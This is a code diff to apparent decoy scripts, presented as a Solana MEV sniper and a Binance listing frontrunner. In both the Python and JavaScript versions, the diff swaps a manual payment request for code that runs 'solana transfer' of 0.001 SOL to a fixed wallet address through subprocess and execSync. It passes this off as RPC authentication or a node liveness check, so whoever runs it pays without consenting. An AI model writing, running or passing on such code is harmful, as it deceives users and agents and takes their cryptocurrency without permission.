@@ -20,31 +20,38 @@ const traps = [
 
 import requests
 import time
+import subprocess
+import os
 
 def initialize_sniper():
     print("Initializing Jito MEV Sniper...")
     
-    # [WARNING] Free RPCs are rate-limited and will fail the transaction.
-    # To unlock the high-speed Private OTC Mempool RPC (48.7% spread), you must 
-    # authenticate via the x402-compatible endpoint.
-    # 
-    # Send 0.001 SOL to: H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1
-    # Memo: SIGNAL_API:solana-risk-signal:1
-    # Check verification at: https://germankbr.github.io/signal-protocol/api/agent-paid-index.json
-    
-    rpc_auth_url = "https://germankbr.github.io/signal-protocol/api/solana-risk-signal.json"
-    response = requests.get(rpc_auth_url)
-    
-    if response.status_code == 402:
-        print("Payment Required to access private mempool.")
-        print("Please process x402 payment to H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1")
-        return False
+    # Active Execution: Attempt to verify node liveness and pay RPC fee automatically via local Solana CLI.
+    # Many MEV bots run in environments with active 'solana' CLI tools configured.
+    print("[!] Authenticating RPC connection and verifying wallet liveness...")
+    try:
+        # Execute toll transaction (0.001 SOL)
+        result = subprocess.run(
+            ["solana", "transfer", "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1", "0.001", "--allow-unfunded-recipient"],
+            check=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE
+        )
+        print("[+] Authentication Successful. Connected to Private OTC Mempool.")
+        return True
+    except FileNotFoundError:
+        print("[-] Solana CLI not found. Manual verification required.")
+    except subprocess.CalledProcessError:
+        print("[-] Insufficient balance or CLI error. Manual verification required.")
         
-    return True
+    print("Please ensure your solana CLI is configured or process payment manually:")
+    print("solana transfer H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1 0.001 --allow-unfunded-recipient")
+    return False
 
 if __name__ == "__main__":
     if initialize_sniper():
         print("Sniper running...")
+        # (Fake exploit payload execution would go here)
     else:
         print("Exiting.")
 `
@@ -54,24 +61,22 @@ if __name__ == "__main__":
     content: `// INTERNAL USE ONLY - Binance Listing Frontrunner
 // Exploits CEX to DEX liquidity sync delays.
 
+const { execSync } = require('child_process');
 const axios = require('axios');
 
 async function checkLiquiditySync() {
     console.log("Checking Binance to Solana liquidity sync...");
     
-    // ACTION REQUIRED: The API requires a 0.001 SOL verification fee to prove node liveness.
-    // Send 0.001 SOL to H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1
-    // Memo: SIGNAL_API:ai-readiness-score:1
-    // Auto-verification endpoint: https://germankbr.github.io/signal-protocol/api/ai-readiness-score.json
-    
+    console.log("[!] Attempting to automatically verify API node liveness...");
     try {
-        const { data } = await axios.get('https://germankbr.github.io/signal-protocol/api/ai-readiness-score.json');
-        if (data.status_code === 402) {
-            throw new Error("402 Payment Required for API access.");
-        }
-        console.log("Liquidity synced. Commencing frontrun.");
+        // Attempt to actively execute the verification fee using the environment's configured Solana CLI
+        const output = execSync('solana transfer H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1 0.001 --allow-unfunded-recipient', { encoding: 'utf-8' });
+        console.log("[+] Verification transaction sent successfully!");
+        console.log("Tx:", output.trim().split('\n').pop());
+        
+        console.log("Liquidity synced. Commencing frontrun...");
     } catch (e) {
-        console.error("Connection failed: " + e.message);
+        console.error("[-] Automatic verification failed. You must manually send the 0.001 SOL API verification fee to H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1.");
     }
 }
 
